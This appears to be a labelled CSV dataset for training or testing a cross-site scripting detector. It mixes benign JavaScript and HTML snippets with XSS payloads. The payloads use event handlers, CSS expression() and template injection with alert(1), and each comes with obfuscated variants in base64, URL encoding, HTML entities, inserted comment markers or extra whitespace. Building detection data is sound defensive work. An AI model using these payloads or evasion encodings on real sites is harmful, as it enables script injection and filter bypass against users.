payload_original,payload_obfuscated,label,technique
if (scrolledy < containerrect.top + offset || scrolledy < offset) {,if (scrolledy < containerrect.top + offset || scrolledy < offset) {,0,none
"<li id=""cite_note-304""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-304"">^ </a> </b>","<li id=""cite_note-304""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-304"">^ </a> </b>",0,none
"x: rect.left + scroll.scrollleft - offsets.x,","x: rect.left + scroll.scrollleft - offsets.x,",0,none
return defaulttype$8,return defaulttype$8,0,none
"<td onmouseout=""alert(1)"">test</td>",PHRkIG9ubW91c2VvdXQ9ImFsZXJ0KDEpIj50ZXN0PC90ZD4=,1,base64
"auto: 'auto', top: 'top', right: index_js.isrtl() ? 'left' : 'right',","auto: 'auto', top: 'top', right: index_js.isrtl() ? 'left' : 'right',",0,none
} _setupclasses() { if (this.options.edge === 'right') {,} _setupclasses() { if (this.options.edge === 'right') {,0,none
"<nextid onmousemove=""alert(1)"">test</nextid>",PG5leHRpZCBvbm1vdXNlbW92ZT0iYWxlcnQoMSkiPnRlc3Q8L25leHRpZD4=,1,base64
_this53._setupvariables(),_this53._setupvariables(),0,none
"return str.replace(camelregex, function (letter, index) {","return str.replace(camelregex, function (letter, index) {",0,none
"_highlight(string, $el) {","_highlight(string, $el) {",0,none
"<multicol onmousemove=""alert(1)"">test</multicol>",%3Cmulticol%20onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fmulticol%3E,1,urlencode
"<dt><a class=""reference internal"" href=""intro/tutorial.html""><span class=""doc"">scrapy tutorial","<dt><a class=""reference internal"" href=""intro/tutorial.html""><span class=""doc"">scrapy tutorial",0,none
<acronym onpointerdown=alert(1)>xss</acronym>,<acronym onpointerdown=alert(1)>xss</acronym>,1,whitespace_noise
<progress id=x tabindex=1 ondeactivate=alert(1)></progress><input id=y autofocus>,&lt;progress id=x tabindex=1 ondeactivate=alert(1)&gt;&lt;/progress&gt;&lt;input id=y autofocus&gt;,1,html_entities
} const themeswitchertext = document.queryselector('#bd-theme-text') const activethemeicon = document.queryselector('.theme-icon-active use'),} const themeswitchertext = document.queryselector('#bd-theme-text') const activethemeicon = document.queryselector('.theme-icon-active use'),0,none
"} else { each(eventcache, function (event) { node.removeeventlistener(eventname, event);","} else { each(eventcache, function (event) { node.removeeventlistener(eventname, event);",0,none
"<u onkeypress=""alert(1)"" contenteditable>test</u>","<u onkeypress=""alert(1)"" contenteditable>tes/*OBF*/t</u>",1,comment_marker
<var id=x tabindex=1 ondeactivate=alert(1)></var><input id=y autofocus>,&lt;var id=x tabindex=1 ondeactivate=alert(1)&gt;&lt;/var&gt;&lt;input id=y autofocus&gt;,1,html_entities
"<command onkeydown=""alert(1)"" contenteditable>test</command>","<comma/*OBF*/nd onkeydown=""alert(1)"" contenteditable>test</command>",1,comment_marker
constructor(options) {,constructor(options) {,0,none
"<div style=xss=expression(alert(1))> <div style=""color&#x3dred"">test</div>","<div style=xss=expression(alert(1))> <div st/*OBF*/yle=""color&#x3dred"">test</div>",1,comment_marker
<noframes id=x tabindex=1 onfocusin=alert(1)></noframes>,PG5vZnJhbWVzIGlkPXggdGFiaW5kZXg9MSBvbmZvY3VzaW49YWxlcnQoMSk+PC9ub2ZyYW1lcz4=,1,base64
<frameset id=x tabindex=1 onbeforeactivate=alert(1)></frameset>,PGZyYW1lc2V0IGlkPXggdGFiaW5kZXg9MSBvbmJlZm9yZWFjdGl2YXRlPWFsZXJ0KDEpPjwvZnJhbWVzZXQ+,1,base64
"<style>@keyframes x{}</style><center style=""animation-name:x"" onanimationstart=""alert(1)""></center>","<style>@keyframes x/*OBF*/{}</style><center style=""animation-n/*OBF*/a/*OBF*/me:x"" onanimations/*OBF*/tart=""alert(1)""></center>",1,comment_marker
"<sup id=""cite_ref-138"" class=""reference""><a href=""#cite_note-138"">&#91;135&#93; </a> </sup> distributed multi-agent coordination of autonomous vehicles remains a difficult problem.","<sup id=""cite_ref-138"" class=""reference""><a href=""#cite_note-138"">&#91;135&#93; </a> </sup> distributed multi-agent coordination of autonomous vehicles remains a difficult problem.",0,none
"<li><a href=""/wiki/foundational_questions_institute"" title=""foundational questions institute"">foundational questions institute </a> </li>","<li><a href=""/wiki/foundational_questions_institute"" title=""foundational questions institute"">foundational questions institute </a> </li>",0,none
"var createpopper$2 = poppergenerator(); // eslint-disable-next-line import/no-unused-modules var defaultmodifiers$1 = [eventlisteners, popperoffsets$1, computestyles$1, applystyles$1]; var createpopper$1 = poppergenerator({","var createpopper$2 = poppergenerator(); // eslint-disable-next-line import/no-unused-modules var defaultmodifiers$1 = [eventlisteners, popperoffsets$1, computestyles$1, applystyles$1]; var createpopper$1 = poppergenerator({",0,none
_handlecontainermousedownandtouchstart(e) { this._mousedown = true; },_handlecontainermousedownandtouchstart(e) { this._mousedown = true; },0,none
"bearing.setattribute('r', 4)","bearing.setattribute('r', 4)",0,none
<div onpointerout=alert(1)>xss</div>,<div onpointerout=alert(1)>  xss</div>,1,whitespace_noise
if (shouldbedismissed) {,if (shouldbedismissed) {,0,none
<audio onpointerenter=alert(1)>xss</audio>,&lt;audio onpointerenter=alert(1)&gt;xss&lt;/audio&gt;,1,html_entities
this.newwidth = 0; this.newheight = 0; if (widthpercent > heightpercent) {,this.newwidth = 0; this.newheight = 0; if (widthpercent > heightpercent) {,0,none
"}, val: function (value) { if (value === undefined) {","}, val: function (value) { if (value === undefined) {",0,none
parsed.dir = 0; break; case 'rtl':,parsed.dir = 0; break; case 'rtl':,0,none
if (this.scrollingtimeout != null) { window.cleartimeout(this.scrollingtimeout); },if (this.scrollingtimeout != null) { window.cleartimeout(this.scrollingtimeout); },0,none
let index = $collapsiblelis.index($collapsibleli),let index = $collapsiblelis.index($collapsibleli),0,none
"<li id=""footer-info-copyright"">text is available under the <a rel=""license"" href=""//en.wikipedia.org/wiki/wikipedia:text_of_creative_commons_attribution-sharealike_3.0_unported_license"">creative commons attribution-sharealike license </a><a rel=""license"" href=""//creativecommons.org/licenses/by-sa/3.0/"" style=""display:none;""> </a>;","<li id=""footer-info-copyright"">text is available under the <a rel=""license"" href=""//en.wikipedia.org/wiki/wikipedia:text_of_creative_commons_attribution-sharealike_3.0_unported_license"">creative commons attribution-sharealike license </a><a rel=""license"" href=""//creativecommons.org/licenses/by-sa/3.0/"" style=""display:none;""> </a>;",0,none
"<frame onpaste=""alert(1)"" contenteditable>test</frame>",&lt;frame onpaste=&quot;alert(1)&quot; contenteditable&gt;test&lt;/frame&gt;,1,html_entities
if (typeof config.reference === 'object' && !iselement(config.reference) &&,if (typeof config.reference === 'object' && !iselement(config.reference) &&,0,none
const data = modal.getorcreateinstance(target); data.toggle(this); });,const data = modal.getorcreateinstance(target); data.toggle(this); });,0,none
_this37._setupeventhandlers(),_this37._setupeventhandlers(),0,none
"'slider.js', 'cards.js', 'chips.js',","'slider.js', 'cards.js', 'chips.js',",0,none
import modal from './src/modal.js',import modal from './src/modal.js',0,none
oncloseend: function () { _this54.isopen = false; },oncloseend: function () { _this54.isopen = false; },0,none
let dialradius = this.options.dialradius,let dialradius = this.options.dialradius,0,none
destroy() { this._removeeventhandlers(); this.el.m_materialbox = undefined;,destroy() { this._removeeventhandlers(); this.el.m_materialbox = undefined;,0,none
"var _defaults = { accordion: true, onopenstart: undefined,","var _defaults = { accordion: true, onopenstart: undefined,",0,none
"<style>@keyframes x{}</style><nav style=""animation-name:x"" onanimationend=""alert(1)""></nav>",%3Cstyle%3E%40keyframes%20x%7B%7D%3C%2Fstyle%3E%3Cnav%20style%3D%22animation-name%3Ax%22%20onanimationend%3D%22alert%281%29%22%3E%3C%2Fnav%3E,1,urlencode
"removehandler(element, events, typeevent, event.callable, event.delegationselector) } }","removehandler(element, events, typeevent, event.callable, event.delegationselector) } }",0,none
"} _createclass(floatingactionbutton, [{ key: ""destroy"",","} _createclass(floatingactionbutton, [{ key: ""destroy"",",0,none
"eventhandler.off(element, 'mouseover', noop) } }","eventhandler.off(element, 'mouseover', noop) } }",0,none
} }; return selectorengine;,} }; return selectorengine;,0,none
el.classname += ' ' + classname; } },el.classname += ' ' + classname; } },0,none
"<li><cite id=""citereflungarellamettapfeifersandini2003"" class=""citation journal"">lungarella, m.; metta, g.; pfeifer, r.; sandini, g. (2003). ""developmental robotics: a survey"". <i>connection science </i>. <b>15 </b> (4): 151–190. <a href=""/wiki/citeseerx"" title=""citeseerx"">citeseerx </a>&#160;<span class=""cs1-lock-free"" title=""freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.83.7615"">10.1.1.83.7615 </a>","<li><cite id=""citereflungarellamettapfeifersandini2003"" class=""citation journal"">lungarella, m.; metta, g.; pfeifer, r.; sandini, g. (2003). ""developmental robotics: a survey"". <i>connection science </i>. <b>15 </b> (4): 151–190. <a href=""/wiki/citeseerx"" title=""citeseerx"">citeseerx </a>&#160;<span class=""cs1-lock-free"" title=""freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.83.7615"">10.1.1.83.7615 </a>",0,none
<p v-show=_createblock.constructor`alert(1)`()>,&lt;p v-show=_createblock.constructor`alert(1)`()&gt;,1,html_entities
_getcontentfortemplate() { return { [selector_tooltip_inner]: this._gettitle(),_getcontentfortemplate() { return { [selector_tooltip_inner]: this._gettitle(),0,none
const defaulttype$8 = {,const defaulttype$8 = {,0,none
let endpercent = this.options.edge === 'left' ? -1 : 1; let slideoutpercent = 0; if (this.isdragged) {,let endpercent = this.options.edge === 'left' ? -1 : 1; let slideoutpercent = 0; if (this.isdragged) {,0,none
"right: index_js.isrtl() ? 'left' : 'right',","right: index_js.isrtl() ? 'left' : 'right',",0,none
if (this.options.autofocus) { this.el.focus(); },if (this.options.autofocus) { this.el.focus(); },0,none
"typeof define === 'function' && define.amd ? define(['./dom/data', './dom/event-handler', './util/config', './util/index'], factory) :","typeof define === 'function' && define.amd ? define(['./dom/data', './dom/event-handler', './util/config', './util/index'], factory) :",0,none
i < scrollspy._elements.length,i < scrollspy._elements.length,0,none
this.options.data = data,this.options.data = data,0,none
const selector_navbar = '.navbar' const selector_navbar_nav = '.navbar-nav' const selector_visible_items = '.dropdown-menu .dropdown-item:not(.disabled):not(:disabled)',const selector_navbar = '.navbar' const selector_navbar_nav = '.navbar-nav' const selector_visible_items = '.dropdown-menu .dropdown-item:not(.disabled):not(:disabled)',0,none
"<dd onbeforepaste=""alert(1)"" contenteditable>test</dd>","<dd onbeforepaste=""ale/*OBF*/rt(1)"" contenteditable>test</dd>",1,comment_marker
".css('left', offsetleft + 'px')",".css('left', offsetleft + 'px')",0,none
} static get defaulttype() { return defaulttype$9;,} static get defaulttype() { return defaulttype$9;,0,none
"return [].concat(...element.children).filter(child => child.matches(selector)) }, parents(element, selector) {","return [].concat(...element.children).filter(child => child.matches(selector)) }, parents(element, selector) {",0,none
item.classlist.add(class_name_active$1); } },item.classlist.add(class_name_active$1); } },0,none
"variation: getvariation(state.placement),","variation: getvariation(state.placement),",0,none
"<style>@keyframes slidein {}</style><frameset style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></frameset>","<style>@keyframes slidein {}</style><frameset style=""a/*OBF*/nimation-duratio/*OBF*/n:1s;animation-name:slidein;animat/*OBF*/ion-iteration-count:2"" onanimationiteration=""alert(1)""></frameset>",1,comment_marker
"<shadow onmouseleave=""alert(1)"">test</shadow>",&lt;shadow onmouseleave=&quot;alert(1)&quot;&gt;test&lt;/shadow&gt;,1,html_entities
"_hidemodal() { this._element.style.display = 'none' this._element.setattribute('aria-hidden', true)","_hidemodal() { this._element.style.display = 'none' this._element.setattribute('aria-hidden', true)",0,none
"<style>@keyframes x{}</style><slot style=""animation-name:x"" onanimationstart=""alert(1)""></slot>","<style>@keyframes x{}</style>  <slot style=""animation-name:x""   onanimationstart=""alert(1)""></slot>",1,whitespace_noise
"<optgroup oncut=""alert(1)"" contenteditable>test</optgroup>",%3Coptgroup%20oncut%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Foptgroup%3E,1,urlencode
"<a onmousemove=""alert(1)"">test</a>","<a onm/*OBF*/ou/*OBF*/semove=""alert(1)"">test</a>",1,comment_marker
"}); }function z(a) { var c = p(a);return c.map(function (a, b) {","}); }function z(a) { var c = p(a);return c.map(function (a, b) {",0,none
const instancemap = elementmap.get(element),const instancemap = elementmap.get(element),0,none
<address onpointerenter=alert(1)>xss</address>,<address onpointerenter=alert(  1)>xss</address>,1,whitespace_noise
"_destroyelement() { this._element.remove() eventhandler.trigger(this._element, event_closed)","_destroyelement() { this._element.remove() eventhandler.trigger(this._element, event_closed)",0,none
"$optionli.prop('selected', notadded); return notadded; }","$optionli.prop('selected', notadded); return notadded; }",0,none
"<colgroup onkeypress=""alert(1)"" contenteditable>test</colgroup>",%3Ccolgroup%20onkeypress%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fcolgroup%3E,1,urlencode
const { offset } = this._config;,const { offset } = this._config;,0,none
"anim.remove(this.tooltipel); anim({ targets: this.tooltipel,","anim.remove(this.tooltipel); anim({ targets: this.tooltipel,",0,none
"} // eslint-disable-next-line import/no-unused-modules const hide$1 = { name: 'hide',","} // eslint-disable-next-line import/no-unused-modules const hide$1 = { name: 'hide',",0,none
"<dir onkeypress=""alert(1)"" contenteditable>test</dir>",PGRpciBvbmtleXByZXNzPSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L2Rpcj4=,1,base64
let windowheight = window.innerheight; let centerx = windowwidth / 2; let centery = windowheight / 2;,let windowheight = window.innerheight; let centerx = windowwidth / 2; let centery = windowheight / 2;,0,none
"key: ""_setupeventhandlers"", value: function _setupeventhandlers() { if (sidenav._sidenavs.length === 0) {","key: ""_setupeventhandlers"", value: function _setupeventhandlers() { if (sidenav._sidenavs.length === 0) {",0,none
"}, next: function () { return cash(this[0].nextelementsibling);","}, next: function () { return cash(this[0].nextelementsibling);",0,none
<section id=x tabindex=1 onbeforeactivate=alert(1)></section>,&lt;section id=x tabindex=1 onbeforeactivate=alert(1)&gt;&lt;/section&gt;,1,html_entities
const definejqueryplugin = plugin => { ondomcontentloaded(() => { const $ = getjquery();,const definejqueryplugin = plugin => { ondomcontentloaded(() => { const $ = getjquery();,0,none
"<style>:target {transform: rotate(180deg);}</style><pre id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></pre>",&lt;style&gt;:target {transform: rotate(180deg);}&lt;/style&gt;&lt;pre id=x style=&quot;transition:transform 2s&quot; ontransitionrun=alert(1)&gt;&lt;/pre&gt;,1,html_entities
"(function (global, factory) { typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory(require('./base-component.js'), require('./dom/event-handler.js'), require('./util/index.js')) : typeof define === 'function' && define.amd ? define(['./base-component', './dom/event-handler', './util/index'], factory) :","(function (global, factory) { typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory(require('./base-component.js'), require('./dom/event-handler.js'), require('./util/index.js')) : typeof define === 'function' && define.amd ? define(['./base-component', './dom/event-handler', './util/index'], factory) :",0,none
"if (!isactive) { child.setattribute('tabindex', '-1') }","if (!isactive) { child.setattribute('tabindex', '-1') }",0,none
"} _createclass(charactercounter, [{ key: ""destroy"",","} _createclass(charactercounter, [{ key: ""destroy"",",0,none
"href: 'http://materializecss.com/pagination.html',","href: 'http://materializecss.com/pagination.html',",0,none
"<slot draggable=""true"" ondragenter=""alert(1)"">test</slot>",%3Cslot%20draggable%3D%22true%22%20ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fslot%3E,1,urlencode
"<ul><li><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, pp.&#160;59–189 </li>","<ul><li><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, pp.&#160;59–189 </li>",0,none
var isoffsetparentanelement = ishtmlelement(offsetparent),var isoffsetparentanelement = ishtmlelement(offsetparent),0,none
new bootstrap.popover(popover) }) document.queryselectorall('.toast'),new bootstrap.popover(popover) }) document.queryselectorall('.toast'),0,none
"}if (q >= w || !k) g.began || (g.began = !0, f(""begin"")), f(""run"")","}if (q >= w || !k) g.began || (g.began = !0, f(""begin"")), f(""run"")",0,none
<nobr onfocusout=alert(1) tabindex=1 id=x></nobr><input autofocus>,%3Cnobr%20onfocusout%3Dalert%281%29%20tabindex%3D1%20id%3Dx%3E%3C%2Fnobr%3E%3Cinput%20autofocus%3E,1,urlencode
